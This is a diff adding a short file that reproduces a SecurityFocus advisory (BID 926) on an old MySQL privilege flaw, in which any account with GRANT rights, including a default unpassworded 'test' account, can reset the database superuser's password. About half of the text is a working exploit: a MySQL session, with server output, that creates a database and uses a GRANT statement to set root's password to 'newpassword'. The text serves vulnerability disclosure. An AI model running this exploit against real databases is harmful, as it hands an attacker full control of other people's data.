@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/926/info
+
+
+MySQL is a popular RDBMS used by many websites as a back-end. It is possible for users with GRANT access to change passwords for every user in the database (including the mysql superuser). MySQL also ships with a default "test" account which has GRANT privileges and is unpassworded, meaning anyone can connect to the db. These two problems combined can result in a total, remote (and probably anonymous) database compromise. The database can be compromised even if the test account is disabled (given a local user account with GRANT privs).
+
+Exploit: Connect to mysql as any user with grant privileges for any table. The default test users will do nicely. If no databases has been created for the test user, do so. Then alter roots (MySQL's roots, not the real roots!) password with a GRANT. After the code below has been executed, the password of the MySQL superuser 'root' will be 'newpassword'.
+
+> mysql -utest -p
+Password:
+
+mysql> CREATE DATABASE test_expl;
+Query OK, 1 row affected (0.04 sec)
+
+mysql> GRANT select ON test_expl.* TO root@localhost IDENTIFIED BY
++'newpassword';
+Query OK, 0 rows affected (0.01 sec)
+
+mysql> exit
+Bye 
